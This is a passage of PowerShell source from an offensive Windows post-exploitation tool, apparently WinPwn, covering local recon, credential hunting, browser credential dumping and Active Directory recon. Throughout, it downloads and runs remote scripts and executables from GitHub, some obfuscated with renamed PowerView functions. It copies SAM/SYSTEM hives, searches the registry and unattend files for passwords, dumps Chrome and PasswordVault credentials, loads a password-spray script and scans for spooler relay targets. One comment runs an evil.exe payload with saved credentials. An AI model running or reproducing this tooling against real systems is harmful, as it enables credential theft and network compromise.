	    wmic qfe >> "$currentPath\LocalRecon\Patches.txt"
            wmic os get osarchitecture >> "$currentPath\LocalRecon\Architecture.txt"
	    Write-Host -ForegroundColor Yellow 'Getting environment variables'
            Get-ChildItem Env: | ft Key,Value >> "$currentPath\LocalRecon\Environmentvariables.txt"
	    Write-Host -ForegroundColor Yellow 'Getting connected drives'
            Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root >> "$currentPath\LocalRecon\Drives.txt"
            Write-Host -ForegroundColor Yellow 'Getting current user Privileges'
	    whoami /priv >> "$currentPath\LocalRecon\Privileges.txt"
            Get-LocalUser | ft Name,Enabled,LastLogon >> "$currentPath\LocalRecon\LocalUsers.txt"
            Write-Host -ForegroundColor Yellow 'Getting local Accounts/Users + Password policy'
	    net accounts >>  "$currentPath\LocalRecon\PasswordPolicy.txt"
            Get-LocalGroup | ft Name >> "$currentPath\LocalRecon\LocalGroups.txt"
	    Write-Host -ForegroundColor Yellow 'Getting network interfaces, route information, Arp table'
            Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address >> "$currentPath\LocalRecon\Networkinterfaces.txt"
            Get-DnsClientServerAddress -AddressFamily IPv4 | ft >> "$currentPath\LocalRecon\DNSServers.txt"
            Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex >> "$currentPath\LocalRecon\NetRoutes.txt"
            Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,LinkLayerAddress,State >> "$currentPath\LocalRecon\ArpTable.txt"
            netstat -ano >> "$currentPath\LocalRecon\ActiveConnections.txt"
            Get-ChildItem 'HKLM:\SOFTWARE\Microsoft\NET Framework Setup\NDP' -Recurse | Get-ItemProperty -Name Version, Release -ErrorAction 0 | where { $_.PSChildName -match '^(?!S)\p{L}'} | select PSChildName, Version, Release >> "$currentPath\LocalRecon\InstalledDotNetVersions"
            Write-Host -ForegroundColor Yellow 'Getting Shares'
	    net share >> "$currentPath\LocalRecon\Networkshares.txt"
	    Write-Host -ForegroundColor Yellow 'Getting hosts file content'
	    get-content $env:windir\System32\drivers\etc\hosts | out-string  >> "$currentPath\LocalRecon\etc_Hosts_Content.txt"
	    Get-ChildItem -Path HKLM:\Software\*\Shell\open\command\ >> "$currentPath\LocalRecon\Test_for_Argument_Injection.txt"
	    
	    Write-Host -ForegroundColor Yellow 'Searching for files with Full Control and Modify Access'
	    Function Get-FireWallRule
    	    {
	    	Param ($Name, $Direction, $Enabled, $Protocol, $profile, $action, $grouping)
    		$Rules=(New-object -comObject HNetCfg.FwPolicy2).rules
    		If ($name)      {$rules= $rules | where-object {$_.name     -like $name}}
    		If ($direction) {$rules= $rules | where-object {$_.direction  -eq $direction}}
    		If ($Enabled)   {$rules= $rules | where-object {$_.Enabled    -eq $Enabled}}
    		If ($protocol)  {$rules= $rules | where-object {$_.protocol   -eq $protocol}}
    		If ($profile)   {$rules= $rules | where-object {$_.Profiles -bAND $profile}}
    		If ($Action)    {$rules= $rules | where-object {$_.Action     -eq $Action}}
    		If ($Grouping)  {$rules= $rules | where-object {$_.Grouping -like $Grouping}}
    		$rules
	    }
	    
	    Get-firewallRule -enabled $true | sort direction,name | format-table -property Name,localPorts,direction | out-string -Width 4096 >> "$currentPath\LocalRecon\Firewall_Rules.txt" 
	    
	    $output = " Files with Full Control and Modify Access`r`n"
	    $output = $output +  "-----------------------------------------------------------`r`n"
    	    $files = get-childitem C:\
    	    foreach ($file in $files)
	    {
        	try {
            	$output = $output +  (get-childitem "C:\$file" -include *.ps1,*.bat,*.com,*.vbs,*.txt,*.html,*.conf,*.rdp,.*inf,*.ini -recurse -EA SilentlyContinue | get-acl -EA SilentlyContinue | select path -expand access | 
            	where {$_.identityreference -notmatch "BUILTIN|NT AUTHORITY|EVERYONE|CREATOR OWNER|NT SERVICE"} | where {$_.filesystemrights -match "FullControl|Modify"} | 
            	ft @{Label="";Expression={Convert-Path $_.Path}}  -hidetableheaders -autosize | out-string -Width 4096)
            	}
        	catch 
		{
            		$output = $output +   "`nFailed to read more files`r`n"
        	}
            }
	    Write-Host -ForegroundColor Yellow 'Searching for folders with Full Control and Modify Access'
	    $output = $output +  "-----------------------------------------------------------`r`n"
    	    $output = $output +  " Folders with Full Control and Modify Access`r`n"
    	    $output = $output +  "-----------------------------------------------------------`r`n"
    	    $folders = get-childitem C:\
    	    foreach ($folder in $folders)
	    {
        	try 
		{
            		$output = $output +  (Get-ChildItem -Recurse "C:\$folder" -EA SilentlyContinue | ?{ $_.PSIsContainer} | get-acl  | select path -expand access |  
            		where {$_.identityreference -notmatch "BUILTIN|NT AUTHORITY|CREATOR OWNER|NT SERVICE"}  | where {$_.filesystemrights -match "FullControl|Modify"} | 
            		select path,filesystemrights,IdentityReference |  ft @{Label="";Expression={Convert-Path $_.Path}}  -hidetableheaders -autosize | out-string -Width 4096)
             	}
            catch 
	    {
            	$output = $output +  "`nFailed to read more folders`r`n"
            }
            }
	    
	    $output >> "$currentPath\LocalRecon\Files_and_Folders_with_Full_Modify_Access.txt"
	    
	    Write-Host -ForegroundColor Yellow 'Checking for potential sensitive user files'
	    get-childitem "C:\Users\" -recurse -Include *.zip,*.rar,*.7z,*.gz,*.conf,*.rdp,*.kdbx,*.crt,*.pem,*.ppk,*.txt,*.xml,*.vnc.*.ini,*.vbs,*.bat,*.ps1,*.cmd -EA SilentlyContinue | %{$_.FullName } | out-string >> "$currentPath\LocalRecon\Potential_Sensitive_User_Files.txt" 
	    
	    Write-Host -ForegroundColor Yellow 'Checking AlwaysInstallElevated'
	    $HKLM = "HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer"
    	    $HKCU =  "HKCU:\SOFTWARE\Policies\Microsoft\Windows\Installer"
    	    if (($HKLM | test-path) -eq "True") 
    	    {
        	if (((Get-ItemProperty -Path $HKLM -Name AlwaysInstallElevated).AlwaysInstallElevated) -eq 1)
        	{
            		echo "AlwaysInstallElevated enabled on this host!" >> "$currentPath\Vulnerabilities\AlwaysInstallElevatedactive.txt"
        	}
    	    }
    	    if (($HKCU | test-path) -eq "True") 
    	    {
        	if (((Get-ItemProperty -Path $HKLM -Name AlwaysInstallElevated).AlwaysInstallElevated) -eq 1)
        	{
            		echo "AlwaysInstallElevated enabled on this host!" >> "$currentPath\Vulnerabilities\AlwaysInstallElevatedactive.txt"
        	}
    	    }
	    Write-Host -ForegroundColor Yellow 'Checking if Netbios is active'
	    $EnabledNics= @(gwmi -query "select * from win32_networkadapterconfiguration where IPEnabled='true'")

	    $OutputObj = @()
            foreach ($Network in $EnabledNics) 
	    {
	    	If($network.tcpipnetbiosoptions) 
	    	{	
	    		$netbiosEnabled = [bool]$network
			if ($netbiosEnabled){Write-Host 'Netbios is active, vulnerability found.'; echo "Netbios Active, check localrecon folder for network interface Info" >> "$currentPath\Vulnerabilities\NetbiosActive.txt"}
	    	}
	    	$nic = gwmi win32_networkadapter | where {$_.index -match $network.index}
	    	$OutputObj  += @{
	    		Nic = $nic.netconnectionid
 	    		NetBiosEnabled = $netbiosEnabled
	    	}
	    }
	    $out = $OutputObj | % { new-object PSObject -Property $_} | select Nic, NetBiosEnabled| ft -auto
	    $out >> "$currentPath\LocalRecon\NetbiosInterfaceInfo.txt"
	    
	    Write-Host -ForegroundColor Yellow 'Checking if IPv6 is active (mitm6 attacks)'
	    $IPV6 = $false
	    $arrInterfaces = (Get-WmiObject -class Win32_NetworkAdapterConfiguration -filter "ipenabled = TRUE").IPAddress
	    foreach ($i in $arrInterfaces) {$IPV6 = $IPV6 -or $i.contains(":")}
	    if ($IPV6){Write-Host 'IPv6 enabled, thats another vulnerability (mitm6)'; echo "IPv6 enabled, check all interfaces for the specific NIC" >> "$currentPath\Vulnerabilities\IPv6_Enabled.txt" }
	    
	    Write-Host -ForegroundColor Yellow 'Collecting installed Software informations'
	    Get-Installedsoftware -Property DisplayVersion,InstallDate | out-string -Width 4096 >> "$currentPath\LocalRecon\InstalledSoftwareAll.txt"
            
	    iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/SecureThisShit/Creds/master/PowershellScripts/Invoke-Vulmap.ps1')
	    Write-Host -ForegroundColor Yellow 'Checking if Software is outdated and therefore vulnerable / exploitable'
	    Invoke-Vulmap | out-string -Width 4096 >> "$currentPath\Vulnerabilities\VulnerableSoftware.txt"
        
            
            # Collecting more information
            Write-Host -ForegroundColor Yellow 'Checking for accesible SAM/SYS Files'
            If (Test-Path -Path 'Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SNMP'){Get-ChildItem -path 'Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SNMP' -Recurse >> "$currentPath\LocalRecon\SNMP.txt"}            
            If (Test-Path -Path %SYSTEMROOT%\repair\SAM){Write-Host -ForegroundColor Yellow "SAM File reachable, looking for SYS?";copy %SYSTEMROOT%\repair\SAM "$currentPath\Vulnerabilities\SAM"}
            If (Test-Path -Path %SYSTEMROOT%\System32\config\SAM){Write-Host -ForegroundColor Yellow "SAM File reachable, looking for SYS?";copy %SYSTEMROOT%\System32\config\SAM "$currentPath\Vulnerabilities\SAM"}
            If (Test-Path -Path %SYSTEMROOT%\System32\config\RegBack\SAM){Write-Host -ForegroundColor Yellow "SAM File reachable, looking for SYS?";copy %SYSTEMROOT%\System32\config\RegBack\SAM "$currentPath\Vulnerabilities\SAM"}
            If (Test-Path -Path %SYSTEMROOT%\System32\config\SAM){Write-Host -ForegroundColor Yellow "SAM File reachable, looking for SYS?";copy %SYSTEMROOT%\System32\config\SAM "$currentPath\Vulnerabilities\SAM"}
            If (Test-Path -Path %SYSTEMROOT%\repair\system){Write-Host -ForegroundColor Yellow "SYS File reachable, looking for SAM?";copy %SYSTEMROOT%\repair\system "$currentPath\Vulnerabilities\SYS"}
            If (Test-Path -Path %SYSTEMROOT%\System32\config\SYSTEM){Write-Host -ForegroundColor Yellow "SYS File reachable, looking for SAM?";copy %SYSTEMROOT%\System32\config\SYSTEM "$currentPath\Vulnerabilities\SYS"}
            If (Test-Path -Path %SYSTEMROOT%\System32\config\RegBack\system){Write-Host -ForegroundColor Yellow "SYS File reachable, looking for SAM?";copy %SYSTEMROOT%\System32\config\RegBack\system "$currentPath\Vulnerabilities\SYS"}

            Write-Host -ForegroundColor Yellow 'Checking Registry for potential passwords'
            REG QUERY HKLM /F "passwor" /t REG_SZ /S /K >> "$currentPath\LocalRecon\PotentialHKLMRegistryPasswords.txt"
            REG QUERY HKCU /F "password" /t REG_SZ /S /K >> "$currentPath\LocalRecon\PotentialHKCURegistryPasswords.txt"

            Write-Host -ForegroundColor Yellow 'Checking sensitive registry entries..'
            If (Test-Path -Path 'Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon')
	        {
	    	    reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" >> "$currentPath\LocalRecon\Winlogon.txt"
	        }
            If (Test-Path -Path 'Registry::HKEY_LOCAL_MACHINE\SYSTEM\Current\ControlSet\Services\SNMP'){reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP" >> "$currentPath\LocalRecon\SNMPParameters.txt"}
            If (Test-Path -Path 'Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Software\SimonTatham\PuTTY\Sessions'){reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" >> "$currentPath\Vulnerabilities\PuttySessions.txt"}
            If (Test-Path -Path 'Registry::HKEY_CURRENT_USER\Software\ORL\WinVNC3\Password'){reg query "HKCU\Software\ORL\WinVNC3\Password" >> "$currentPath\Vulnerabilities\VNCPassword.txt"}
            If (Test-Path -Path 'Registry::HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4'){reg query HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4 /v password >> "$currentPath\Vulnerabilities\RealVNCPassword.txt"}

            If (Test-Path -Path C:\unattend.xml){copy C:\unattend.xml "$currentPath\Vulnerabilities\unattended.xml"; Write-Host -ForegroundColor Yellow 'Unattended.xml Found, check it for passwords'}
            If (Test-Path -Path C:\Windows\Panther\Unattend.xml){copy C:\Windows\Panther\Unattend.xml "$currentPath\Vulnerabilities\unattended.xml"; Write-Host -ForegroundColor Yellow 'Unattended.xml Found, check it for passwords'}
            If (Test-Path -Path C:\Windows\Panther\Unattend\Unattend.xml){copy C:\Windows\Panther\Unattend\Unattend.xml "$currentPath\Vulnerabilities\unattended.xml"; Write-Host -ForegroundColor Yellow 'Unattended.xml Found, check it for passwords'}
            If (Test-Path -Path C:\Windows\system32\sysprep.inf){copy C:\Windows\system32\sysprep.inf "$currentPath\Vulnerabilities\sysprep.inf"; Write-Host -ForegroundColor Yellow 'Sysprep.inf Found, check it for passwords'}
            If (Test-Path -Path C:\Windows\system32\sysprep\sysprep.xml){copy C:\Windows\system32\sysprep\sysprep.xml "$currentPath\Vulnerabilities\sysprep.inf"; Write-Host -ForegroundColor Yellow 'Sysprep.inf Found, check it for passwords'}

            Get-Childitem -Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue >> "$currentPath\Vulnerabilities\webconfigfiles.txt"
	    
	    Write-Host -ForegroundColor Yellow 'List running tasks'
            Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize >> "$currentPath\LocalRecon\RunningTasks.txt"

            Write-Host -ForegroundColor Yellow 'Checking for usable credentials (cmdkey /list)'
            cmdkey /list >> "$currentPath\Vulnerabilities\SavedCredentials.txt" # runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"

            }

           function dotnet{
                Write-Host -ForegroundColor Yellow 'Searching for Files - Output is saved to the localrecon folder:'
                iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/SecureThisShit/Creds/master/PowershellScripts/Get-DotNetServices.ps1')
                Get-DotNetServices  >> "$currentPath\LocalRecon\DotNetBinaries.txt"
            }

            function morerecon{
            if (isadmin)
            {
                $PSrecon = Read-Host -Prompt 'Do you want to gather local computer Informations with PSRecon? (yes/no)'
                if ($PSrecon -eq "yes" -or $PSrecon -eq "y" -or $PSrecon -eq "Yes" -or $PSrecon -eq "Y")
                {
                    invoke-expression 'cmd /c start powershell -Command {$Wcl = new-object System.Net.WebClient;$Wcl.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;Invoke-WebRequest -Uri ''https://raw.githubusercontent.com/gfoss/PSRecon/master/psrecon.ps1'' -Outfile .\LocalRecon\Psrecon.ps1;Write-Host -ForegroundColor Yellow ''Starting PsRecon:'';.\LocalRecon\Psrecon.ps1;pause}'
                }
                Write-Host -ForegroundColor Yellow 'Saving general computer information to .\LocalRecon\Computerdetails.txt:'
                Get-ComputerDetails >> "$currentPath\LocalRecon\Computerdetails.txt"

                Write-Host -ForegroundColor Yellow 'Starting WINSpect:'
            invoke-expression 'cmd /c start powershell -Command {$Wcl = new-object System.Net.WebClient;$Wcl.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;IEX (New-Object Net.WebClient).DownloadString(''https://raw.githubusercontent.com/A-mIn3/WINspect/master/WINspect.ps1'');}'
            }
            }

         
            function sensitivefiles{
            
                IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/SecureThisShit/Creds/master/obfuscatedps/find-interesting.ps1')
                Write-Host -ForegroundColor Yellow 'Looking for interesting files:'
                try{Find-InterestingFile -Path 'C:\' -Outfile "$currentPath\LocalRecon\InterestingFiles.txt"}catch{Write-Host ":-("}
                try{Find-InterestingFile -Path 'C:\' -Terms pass,login,rdp,kdbx,backup -Outfile "$currentPath\LocalRecon\MoreFiles.txt"}catch{Write-Host ":-("}
                Write-Verbose "Enumerating more interesting files..."
    
                $SearchStrings = "*secret*","*net use*","*.kdb*","*creds*","*credential*","*.vmdk","*confidential*","*proprietary*","*pass*","*credentials*","web.config","KeePass.config*","*.kdbx","*.key","tnsnames.ora","ntds.dit","*.dll.config","*.exe.config"
                $IndexedFiles = Foreach ($String in $SearchStrings) {Get-IndexedFiles $string}
      
                $IndexedFiles |Format-List |Out-String -width 500 >> "$currentPath\LocalRecon\Sensitivelocalfiles.txt"
                GCI $ENV:USERPROFILE\ -recurse -include *pass*,*diagram*,*.pdf,*.vsd,*.doc,*docx,*.xls,*.xlsx,*.kdbx,*.kdb,*.rdp,*.key,KeePass.config | Select-Object Fullname,LastWriteTimeUTC,LastAccessTimeUTC,Length | Format-Table -auto | Out-String -width 500 >> "$currentPath\LocalRecon\MoreSensitivelocalfiles.txt"
                function Get-IndexedFiles {
                param (
                [Parameter(Mandatory=$true)][string]$Pattern)  
    
                if($Path -eq ""){$Path = $PWD;} 
        
                $pattern = $pattern -replace "\*", "%"  
                $path = $path + "\%"
    
                 $con = New-Object -ComObject ADODB.Connection
                $rs = New-Object -ComObject ADODB.Recordset
    
                Try {
                    $con.Open("Provider=Search.CollatorDSO;Extended Properties='Application=Windows';")}
                Catch {
                    "[-] Indexed file search provider not available";Break
                }
                $rs.Open("SELECT System.ItemPathDisplay FROM SYSTEMINDEX WHERE System.FileName LIKE '" + $pattern + "' " , $con)
    
                While(-Not $rs.EOF){
                $rs.Fields.Item("System.ItemPathDisplay").Value
                 $rs.MoveNext()
                }
            }
            }
            
            function browserpwn{
            $chrome = Read-Host -Prompt 'Dump Chrome Browser history and maybe passwords? (yes/no)'
            if ($chrome -eq "yes" -or $chrome -eq "y" -or $chrome -eq "Yes" -or $chrome -eq "Y")
            {
                iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/SecureThisShit/Creds/master/PowershellScripts/Get-ChromeDump.ps1')
                Install-SqlLiteAssembly
                Get-ChromeDump >> "$currentPath\Exploitation\Chrome_Credentials.txt"
                Get-ChromeHistory >> "$currentPath\LocalRecon\ChromeHistory.txt"
                Write-Host -ForegroundColor Yellow 'Done, look in the localrecon folder for creds/history:'
            }
	    
            $IE = Read-Host -Prompt 'Dump IE / Edge Browser passwords? (yes/no)'
            if ($IE -eq "yes" -or $IE -eq "y" -or $IE -eq "Yes" -or $IE -eq "Y")
            {
	    	    [void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]
	    	    $vault = New-Object Windows.Security.Credentials.PasswordVault 
	    	    $vault.RetrieveAll() | % { $_.RetrievePassword();$_ } >> "$currentPath\Exploitation\InternetExplorer_Credentials.txt"
	        }
            $browserinfos = Read-Host -Prompt 'Dump all installed Browser history and bookmarks? (yes/no)'
            if ($browserinfos -eq "yes" -or $browserinfos -eq "y" -or $browserinfos -eq "Yes" -or $browserinfos -eq "Y")
            {
                IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/SecureThisShit/Creds/master/PowershellScripts/Get-BrowserInformation.ps1')
                Get-BrowserInformation | out-string -Width 4096 >> "$currentPath\LocalRecon\AllBrowserHistory.txt"
            }
            }
                pathcheck
    $currentPath = (Get-Item -Path ".\" -Verbose).FullName
    @'

             
__        ___       ____                 
\ \      / (_)_ __ |  _ \__      ___ __  
 \ \ /\ / /| | '_ \| |_) \ \ /\ / | '_ \ 
  \ V  V / | | | | |  __/ \ V  V /| | | |
   \_/\_/  |_|_| |_|_|     \_/\_/ |_| |_|

   --> Localreconmodules

'@
    
    do
    {
        Write-Host "================ WinPwn ================"
        Write-Host -ForegroundColor Green '1. Collect general computer informations, this will take some time!'
        Write-Host -ForegroundColor Green '2. Check Powershell event logs for credentials or other sensitive information! '
        Write-Host -ForegroundColor Green '3. Collect Browser credentials as well as the history! '
        Write-Host -ForegroundColor Green '4. Search for .NET Binaries on this system! '
        Write-Host -ForegroundColor Green '5. Search for Passwords on this system using passhunt.exe!'
        Write-Host -ForegroundColor Green '6. Start SessionGopher! '
        Write-Host -ForegroundColor Green '7. Search for sensitive files on this local system (config files, rdp files, password files and more)! '
        Write-Host -ForegroundColor Green '8. Execute PSRecon or Get-ComputerDetails (powersploit)! '
        Write-Host -ForegroundColor Green '9. Exit. '
        Write-Host "================ WinPwn ================"
        $masterquestion = Read-Host -Prompt 'Please choose wisely, master:'

        Switch ($masterquestion) 
        {
             1{generalrecon}
             2{powershellsensitive}
             3{browserpwn}
             4{dotnet}
             5{passhunt -local $true}
             6{sessiongopher}
             7{sensitivefiles}
             8{morerecon}
       }
    }
 While ($masterquestion -ne 9)
}

function passhunt
{
<#
        .DESCRIPTION
        Search for hashed or cleartext passwords on the local system or on the domain.
        Author: @SecureThisShit
        License: BSD 3-Clause
    #>
    #Local/Domain Recon / Privesc
    Param
    (
        [bool]
        $local,

        [bool]
        $domain
    )
    pathcheck
    $currentPath = (Get-Item -Path ".\" -Verbose).FullName
    IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/SecureThisShit/Creds/master/obfuscatedps/viewdevobfs.ps1')

        if ($domain)
        {
            Write-Host -ForegroundColor Yellow 'Collecting active Windows Servers from the domain...'
            $ActiveServers = Get-DomainComputer -Ping -OperatingSystem "Windows Server*"
            $ActiveServers.dnshostname >> "$currentPath\DomainRecon\activeservers.txt"

            IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/SecureThisShit/Creds/master/obfuscatedps/viewobfs.ps1')
            Write-Host -ForegroundColor Yellow 'Searching for Shares on the found Windows Servers...'
            brainstorm -ComputerFile "$currentPath\DomainRecon\activeservers.txt" -NoPing -CheckShareAccess | Out-File -Encoding ascii "$currentPath\DomainRecon\found_shares.txt"
             
            $shares = Get-Content "$currentPath\DomainRecon\found_shares.txt"
            $testShares = foreach ($line in $shares){ echo ($line).Split(' ')[0]}

            Write-Host -ForegroundColor Yellow 'Starting Passhunt.exe for all found shares.'
            if (test-path $currentPath\passhunt.exe)
            {
                foreach ($line in $testShares)
                {
                    cmd /c start powershell -Command "$currentPath\passhunt.exe -s $line"
                }
            }
            else
            {
                [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
                Invoke-WebRequest -Uri 'https://github.com/SecureThisShit/Creds/blob/master/exeFiles/passhunt.exe' -Outfile $currentPath\passhunt.exe
                foreach ($line in $shares)
                {
                    cmd /c start powershell -Command "$currentPath\passhunt.exe -s $line"
                } 
                                    
            }
        }
        if ($local)
        {
            [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
            Invoke-WebRequest -Uri 'https://github.com/SecureThisShit/Creds/blob/master/exeFiles/passhunt.exe' -Outfile $currentPath\passhunt.exe
            
            cmd /c start powershell -Command "$currentPath\passhunt.exe"
            $sharepasshunt = Read-Host -Prompt 'Do you also want to search for Passwords on all connected networkshares?'
            if ($sharepasshunt -eq "yes" -or $sharepasshunt -eq "y" -or $sharepasshunt -eq "Yes" -or $sharepasshunt -eq "Y")
            {
                get-WmiObject -class Win32_Share | ft Path >> passhuntshares.txt
                $shares = get-content .\passhuntshares.txt | select-object -skip 4    
                foreach ($line in $shares)
                {
                    cmd /c start powershell -Command "$currentPath\passhunt.exe -s $line"
                } 
                                  
            }
        }
        else
        {
            [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
            Invoke-WebRequest -Uri 'https://github.com/SecureThisShit/Creds/blob/master/exeFiles/passhunt.exe' -Outfile $currentPath\passhunt.exe
            cmd /c start powershell -Command "$currentPath\passhunt.exe"
        }

}


function domainreconmodules
{
<#
        .DESCRIPTION
        All domain recon scripts are executed here.
        Author: @securethisshit
        License: BSD 3-Clause
    #>
            #Domain / Network Reconing


 function generaldomaininfo{
            IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/SecureThisShit/Creds/master/PowershellScripts/DomainPasswordSpray.ps1')
            IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/SecureThisShit/Creds/master/obfuscatedps/view.ps1')
            $domain_Name = skulked
            $Domain = $domain_Name.Name

            Write-Host -ForegroundColor Yellow 'Starting Domain Recon phase:'

            Write-Host -ForegroundColor Yellow 'Creating Domain User-List:'
            Get-DomainUserList -Domain $domain_Name.Name -RemoveDisabled -RemovePotentialLockouts | Out-File -Encoding ascii "$currentPath\DomainRecon\userlist.txt"
            
            Write-Host -ForegroundColor Yellow 'Searching for Exploitable Systems:'
            inset >> "$currentPath\DomainRecon\ExploitableSystems.txt"

            #Powerview
            Write-Host -ForegroundColor Yellow 'All those PowerView Network Skripts for later Lookup getting executed and saved:'
	    try{
            skulked >> "$currentPath\DomainRecon\NetDomain.txt"
            televisions >> "$currentPath\DomainRecon\NetForest.txt"
            misdirects >> "$currentPath\DomainRecon\NetForestDomain.txt"      
            odometer >> "$currentPath\DomainRecon\NetDomainController.txt"  
            Houyhnhnm >> "$currentPath\DomainRecon\NetUser.txt"    
            Randal >> "$currentPath\DomainRecon\NetSystems.txt"
	        Get-Printer >> "$currentPath\DomainRecon\localPrinter.txt"
            damsels >> "$currentPath\DomainRecon\NetOU.txt"    
            xylophone >> "$currentPath\DomainRecon\NetSite.txt"  
            ignominies >> "$currentPath\DomainRecon\NetSubnet.txt"
            reapportioned >> "$currentPath\DomainRecon\NetGroup.txt" 
            confessedly >> "$currentPath\DomainRecon\NetGroupMember.txt"   
            aqueduct >> "$currentPath\DomainRecon\NetFileServer.txt" 
            marinated >> "$currentPath\DomainRecon\DFSshare.txt" 
            liberation >> "$currentPath\DomainRecon\NetShare.txt" 
            cherubs >> "$currentPath\DomainRecon\NetLoggedon"
            Trojans >> "$currentPath\DomainRecon\Domaintrusts.txt"
            sequined >> "$currentPath\DomainRecon\ForestTrust.txt"
            ringer >> "$currentPath\DomainRecon\ForeignUser.txt"
            condor >> "$currentPath\DomainRecon\ForeignGroup.txt"
            }catch{Write-Host "Got an error"}
	    IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/SecureThisShit/Creds/master/obfuscatedps/viewdevobfs.ps1')
            breviaries -Printers >> "$currentPath\DomainRecon\DomainPrinters.txt" 	        
	    IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/SecureThisShit/Creds/master/PowershellScripts/SPN-Scan.ps1')
	    Discover-PSInterestingServices >> "$currentPath\DomainRecon\SPNScan_InterestingServices.txt"
	    
            #Search for AD-Passwords in description fields
            Write-Host -ForegroundColor Yellow 'Searching for passwords in active directory description fields..'
            
            [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
            
            Invoke-Webrequest -Uri 'https://github.com/SecureThisShit/Creds/raw/master/Microsoft.ActiveDirectory.Management.dll' -Outfile "$currentPath\Microsoft.ActiveDirectory.Management.dll"
            Import-Module .\Microsoft.ActiveDirectory.Management.dll
            Start-Sleep -Seconds 2
	        iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/SecureThisShit/Creds/master/obfuscatedps/adpass.ps1')
            thyme >> "$currentPath\DomainRecon\Passwords_in_description.txt"

            Write-Host -ForegroundColor Yellow 'Searching for Users without password Change for a long time'
	        $Date = (Get-Date).AddYears(-1).ToFileTime()
            prostituted -LDAPFilter "(pwdlastset<=$Date)" -Properties samaccountname,pwdlastset >> "$currentPath\DomainRecon\Users_Nochangedpassword.txt"
	        
	        prostituted -LDAPFilter "(!userAccountControl:1.2.840.113556.1.4.803:=2)" -Properties distinguishedname >> "$currentPath\DomainRecon\Enabled_Users.txt"
            prostituted -UACFilter NOT_ACCOUNTDISABLE -Properties distinguishedname >> "$currentPath\DomainRecon\Enabled_Users.txt"
	        
            Write-Host -ForegroundColor Yellow 'Searching for Unconstrained delegation Systems and Users'
	        $Computers = breviaries -Unconstrained >> "$currentPath\DomainRecon\Unconstrained_Systems.txt"
            $Users = prostituted -AllowDelegation -AdminCount >> "$currentPath\DomainRecon\AllowDelegationUsers.txt"
	        
            Write-Host -ForegroundColor Yellow 'Identify kerberos and password policy..'
	        $DomainPolicy = forsakes -Policy Domain
            $DomainPolicy.KerberosPolicy >> "$currentPath\DomainRecon\Kerberospolicy.txt"
            $DomainPolicy.SystemAccess >> "$currentPath\DomainRecon\Passwordpolicy.txt"
	        
            Write-Host -ForegroundColor Yellow 'Searching for Systems we have RDP access to..'
	        rewires -LocalGroup RDP -Identity $env:Username  >> "$currentPath\DomainRecon\RDPAccess_Systems.txt" 
	        }
            
            function spoolvulnscan{
            
	    	        Write-Host -ForegroundColor Yellow 'Checking Domain Controllers for MS-RPRN RPC-Service! If its available, you can nearly do DCSync.' #https://www.slideshare.net/harmj0y/derbycon-the-unintended-risks-of-trusting-active-directory
                    iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/SecureThisShit/SpoolerScanner/master/SpoolerScan.ps1')
                    $domcontrols = terracing
                    foreach ($domc in $domcontrols.IPAddress)
                    {
		    	try{
                        if (spoolscan -target $domc)
                        {
                            Write-Host -ForegroundColor Yellow 'Found vulnerable DC. You can take the DC-Hash for SMB-Relay attacks now'
                            echo "$domc" >> "$currentPath\Vulnerabilities\MS-RPNVulnerableDC.txt"
                        }
			}catch{Write-Host "Got an error"}
                    }
		    $othersystems = Read-Host -Prompt 'Start MS-RPRN RPC Service Scan for other active Windows Servers in the domain? (yes/no)'
            	    if ($othersystems -eq "yes" -or $othersystems -eq "y" -or $othersystems -eq "Yes" -or $othersystems -eq "Y")
                    {
		    	Write-Host -ForegroundColor Yellow 'Searching for active Servers in the domain, this can take a while depending on the domain size'
		    	$ActiveServers = breviaries -Ping -OperatingSystem "Windows Server*"
			foreach ($acserver in $ActiveServers.dnshostname)
                    	{
				try{
                        	if (spoolscan -target $acserver)
                        	{
                            		Write-Host -ForegroundColor Yellow 'Found vulnerable Server - $acserver. You can take the DC-Hash for SMB-Relay attacks now'
